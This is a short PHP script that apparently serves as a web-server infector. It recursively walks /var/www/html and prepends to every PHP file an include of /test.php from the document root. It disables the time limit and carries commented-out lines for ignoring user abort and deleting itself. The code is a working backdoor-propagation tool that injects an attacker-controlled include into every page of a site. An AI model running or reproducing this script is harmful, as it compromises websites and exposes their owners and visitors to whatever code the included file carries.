<?php
set_time_limit(0);
// ignore_user_abort(1);
// unlink(__FILE__);
function getfiles($path){
    foreach(glob($path) as $afile){
        if(is_dir($afile))
          getfiles($afile.'/*.php');
        else
          file_put_contents($afile,'<?php include($_SERVER["DOCUMENT_ROOT"]."/test.php");?>\r\n'.file_get_contents($afile));
    }
}
getfiles('/var/www/html');

?>